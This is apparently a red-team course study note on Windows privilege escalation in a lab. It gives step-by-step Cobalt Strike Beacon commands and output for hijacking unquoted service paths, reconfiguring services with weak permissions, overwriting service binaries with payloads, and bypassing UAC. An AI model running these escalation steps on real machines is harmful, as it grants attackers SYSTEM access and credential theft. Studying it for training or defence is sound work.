---
description: 09/03/2025
---

# Host Privilege Escalation

## What is Privilege Escalation?

Host privilege escalation allows us to be able to elevate privileges from that of a standard user to `Administrator` or `SYSTEM`.&#x20;

### Is it _always_ necessary?&#x20;

No, it is not always a necessary step, we do not need to accomplish `SYSTEM` on every single endpoint.&#x20;

**Why?**

This is because it is possible to obtain and leverage privileged credentials and to be able to pivot laterally throughout the domain without having to perform "priv esc" first.

**However...**

Keep in mind that elevated privileges can provide a serious tactical advantage by allowing you to leverage some additional capabilities.

For example, this can include dumping credentials with [<mark style="color:yellow;">Mimikatz</mark>](https://github.com/ParrotSec/mimikatz), <mark style="color:yellow;">**installing sneaky persistence**</mark>, or <mark style="color:yellow;">manipulating host configuration such as the firewall</mark>.

By keeping the mantra of "principle of least privilege", privilege escalation should only be sought after if it involves your goals and what you need to achieve those said goals.

* You should not want to simply just "priv esc" just to "priv esc"

### Implications

Exploiting a privilege escalation vulnerability provides defenders with additional data points, intel, and potential to be able to detect your presence.

{% hint style="info" %}
It is ultimately a calculated risk that you must make. Risk vs. Reward.
{% endhint %}

### High-Level Common Methods for Privelege Escalation

* Operating System or third party software misconfigurations
* Missing patches

### Tool to help?

We can use [SharpUp](https://github.com/ParrotSec/mimikatz) to aid in the enumeration of host-based misconfigurations to outline potential "priv esc" opportunities.

## Windows Services

### What is it?

A Windows _**service**_ is a special type of application that is usually started automatically when the computer boots.

Services are used to start and manage core Windows functionality.

**This includes:**

* Windows Defender
* Windows Firewall
* Windows Automatic Update
* And so much more

{% hint style="info" %}
Note that third party applications have the ability of installing a Windows service to manage how and when services are ran.
{% endhint %}

### Viewing Services Installed on a Machine

**We can see the services installed on a machine by using the `services.msc` utility or the `sc` command-line tool:**

```
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

**We can also utilize the `Get-Service` PowerShell cmdlet:**

```
PS C:\> Get-Service | fl

Name                : AJRouter
DisplayName         : AllJoyn Router Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess

Name                : ALG
DisplayName         : Application Layer Gateway Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

### What to Look for...

We are going to want to identify several properties and closely evaluate them all:

1. **Binary Path**
   1. This is the path where the actual executable for the service is located. Windows services are often located within `C:\Windows\system32` and third-party is located within `C:\Program Files/C:\Program Files (x86)`.
2. **Startup Type**
   1. This dictates when the service should start.
      1. `Automatic` - The service start immediately on boot.
      2. `Automatic (Delayed Start)` - The service waits a short amount of time after boot before starting — legacy option for efficiency.
      3. `Manual` - The service will only start when specifically asked.
      4. `Disabled` - The service is currently in a _**disabled**_ state and will not run.
3. **Service Status**
   1. This is the current status of the service.
      1. `Running` - The service is running.
      2. `Stopped` - The service is not running.
      3. `StartPending` - The service has been asked to start and is executing its startup procedure.
      4. `StopPending` - The service has been asked to stop and is executing its shutdown procedure.
4. **Log On As**
   1. The user account that the service is configured to run as.
   2. This could be a domain or local account. It's very common for these services to be run as highly-privileged accounts, even domain admins, or as the local system. This is why services can be an attractive target for both local and domain privilege escalation.&#x20;
5. **Dependents & Dependencies**&#x20;
   1. These are services that either the current service is dependent on to run, or other services that are dependent on this service to run. This information is mainly important to understand the overall potential impact of manipulation.
   2. File and folders services themselves (not just the `.exe`) have permissions that are assigned to them. This controls which users within the domain can modify, start, or stop the service.&#x20;
   3. Some highly sensitive services such as Windows Defender cannot be stopped, even by administrators. Other services may have much weaker permissions that allow users to be able to modify them for privilege escalation.
   4. After a service has been manipulated to trigger a privilege escalation, it needs to be restarted (or started if it's already stopped). There will be some cases where this can be done with the management tools, if you have the required permissions. Other times, you will need to rely on a reboot for it to take place.

## Unquoted Service Paths

### What is it?

An _**unquoted service path**_ is <mark style="color:yellow;">where the path to the service binary is not wrapped in quotes</mark>.

### Why is this problematic?

By itself, it is not a problem. However, <mark style="color:yellow;">under specific conditions, it can lead to a path of an elevation of privilege</mark>.

### Identifying Unquoted Service Paths

_**WMI**_**&#x20;can be used to pull a list of every service and the path to its executable. Here are some examples:**

{% code fullWidth="true" %}
```
beacon> run wmic service get name, pathname

Name                    PathName
ALG                     C:\Windows\System32\alg.exe
AppVClient              C:\Windows\system32\AppVClient.exe
Sense                   "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
[...snip...]
VulnService1            C:\Program Files\Vulnerable Services\Service 1.exe
```
{% endcode %}

Above, we can see that the paths for `ALG` and `AppVClient` are not quoted, but the path for `Sense` is.

The difference is that this latter path has _**spaces**_ in them.

<mark style="color:$danger;">`VulnService1`</mark> <mark style="color:$danger;"></mark><mark style="color:$danger;">has spaces in the path and is also not quoted — This is a root-cause for Unquoted Service Path exploitation, leading to privilege escalation.</mark>

### How does it work?

When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

#### Exploitation How-To

If we can "drop" a binary into any of those paths, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them — This is another condition.&#x20;

**The PowerShell `Get-Acl` cmdlet will show the permissions of various objects (including files and directories):**

{% code fullWidth="true" %}
```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  CreateFiles, Synchronize
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x100002;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CII
         OID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;I
         D;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;A
         C)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```
{% endcode %}

Above, we can see from the output that `BUILTIN\Users` have the `CreateFiles` privilege on the `C:\Program Files\Vulnerable Services` directory, which means that we can upload a malicious binary to hijack this unquoted path.

<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

### Using SharpUp

We can also rely on [SharpUp](https://github.com/GhostPack/SharpUp) to <mark style="color:$warning;">**list any services that match these conditions**</mark>.

{% code fullWidth="true" %}
```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Unquoted Paths ===
	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.
```
{% endcode %}

### Abusing Services

Payloads used to abuse services _**must be**_ "<mark style="color:$danger;">**service binaries**</mark>", because they need to be capable of interacting with the _**Service Control Manager**_.

{% hint style="info" %}
It is recommended to make use of the `TCP` Beacons that are bound to `localhost` only for privilege escalations.
{% endhint %}

#### Uploading a Malicious Service Binary to a Victim via Beacon

```
beacon> cd C:\Program Files\Vulnerable Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe

beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe
 290kb    fil     03/03/2021 11:11:27   Service.exe

beacon> run sc stop VulnService1

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

beacon> run sc start VulnService1

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4384
        FLAGS              : 
```

{% hint style="info" %}
Standard users cannot stop or start services by default, so you would need to usually need to wait for a computer reboot to occur.

This privilege has been granted throughout the lab and hopefully the exam.
{% endhint %}

### Using the Malicious Service Binary

When you start the service, you will see that its state will be `START_PENDING`. If you then check its status with `sc query VulnService1`, you will see that it will be in a `STOPPED` state. This is by design.

You will also not see a Beacon appear within the UI of Cobalt Strike automatically. However, you should see the port you used in your TCP listener configurations (likely `4444`) which is now listening on `127.0.0.1` (`localhost`).

**To verify this, we can run `netstat` via the Beacon shell:**

```
beacon> run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
```

### Connecting to the Service Listener

**The Beacon is now in a listening (awaiting connection) state, we can now rely on our Beacon shell to connect to it using the `connect` command:**

```
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

<figure><img src="../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

### Restoring the Service

Simply delete the `Service.exe` and restart the endpoint.

## Weak Service Permissions

### Further Triaging SharpUp Output

**The following output shows that `VulnService2` is `modifiable`:**

```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService2' (State: Running, StartMode: Auto)
```

Although it shows that it is a `modifiable` service, it still does not show exactly what those explicit permissions are, so we are going to need to enumerate further.&#x20;

**We can accomplish this with the following PowerShell script, `Get-ServiceAcl.ps1` that will print out which service rights we have access to:**

```
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

Here, we can see that all `Authenticated Users` have `ChangeConfig`, `Start` and `Stop` privileges over this service.

### Abusing Weak Permissions

As a result, we can abuse these weak permissions by changing the binary path of the service — so rather than running `C:\Program Files\Vulnerable Services\Service2.exe`, we can run something like `C:\Temp\Payload.exe`.

1. **First, we need to validate that the current path is `"C:\Program Files\Vulnerable Services\Service 2.exe"` (also note that the path is quoted):**

```
beacon> run sc qc VulnService2
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

2. **Next, we need to upload a service binary payload and reconfigure the binary path on the vulnerable service:**

```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
[SC] ChangeServiceConfig SUCCESS
```

{% hint style="info" %}
Note: the space after `binPath=` is intentional.
{% endhint %}

3. **Now, validate that the path has indeed been updated:**

```
beacon> run sc qc VulnService2

SERVICE_NAME: Vuln-Service-2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\tcp-local_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

**Since the service is currently running (can be seen by running `sc query VulnService2`), we must stop and then start the service to execute our malicious binary as so:**

```
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

**To restore the previous binary path:**

```
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
[SC] ChangeServiceConfig SUCCESS
```

{% hint style="warning" %}
The additional set of escaped quotes is necessary to ensure that the path remains fully quoted, otherwise you could introduce a new unquoted service path vulnerability.
{% endhint %}

## Weak Service Binary Permissions

This may seem slightly different than the previous vulnerability, but instead of the weak permissions being on the service, it's on the service binary itself.

```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services\Service 3.exe
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  Modify, Synchronize
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x1301bf;;;BU)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200
         a9;;;S-1-15-2-2)
```

The output above shows that `BUILTIN\Users` have `Modify` privileges over `Service3.exe`.

**This allows us to overwrite the binary with something else (make sure you take a backup first):**

```
beacon> download Service 3.exe
[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
[*] download of Service 3.exe is complete
```

{% hint style="info" %}
Be sure to make a copy of your payload while renaming it to `Service 3.exe`.

```
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
```
{% endhint %}

**Then, attempt to upload it:**

```
beacon> upload C:\Payloads\Service 3.exe
[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
```

{% hint style="info" %}
You will likely get the following error:

```
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

This means that the file is already in use, which makes sense since the service is already running.
{% endhint %}

```
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

## User Account Control (UAC) Bypasses

### What is UAC?

UAC is a technology that exists in Windows which forces applications to prompt for consent when requesting an Administrative Access Token.

### For Example...

_Bob_ is a local administrator on _**Workstation 2**_, but if we open a Command Prompt and attempt to add a new local user, we will get an access denied.

This instance of `cmd.exe` is running in _**Medium Integrity**_ mode.

**Below, we attempt to add a new user, `hacker`, via `net user`:**

```
C:\Users\bfarmer>net user hacker Passw0rd! /add
System error 5 has occurred.

Access is denied.

C:\Users\bfarmer>whoami /groups

Mandatory Label\Medium Mandatory Level
```

Instead, we will need to right-click or `CTRL` + `SHIFT` + `ENTER` to _**Run as Administrator**_ and cause a UAC prompt to appear.

<figure><img src="../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

After clicking _**yes**_, the Command Prompt will open will sufficient privileges, appropriate for making system configuration changes, as it will now be running in _**High Integrity**_.

```
C:\Windows\system32>whoami /groups

Mandatory Label\High Mandatory Level
```

A "UAC Bypass" is a technique that allows for a _**Medium Integrity**_ process to elevate itself or spawn a new process in _**High Integrity**_, without prompting the user for consent.

Being in _**High Integrity**_ context is important for attackers because it's required for various post-exploitation actions such as dumping credentials.

**Beacon** has a few built-in UAC bypasses and a few more which are covered via the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) (pre-loaded in Cobalt Strike).&#x20;

These are exposed via the `elevate` command.

```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```

<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>
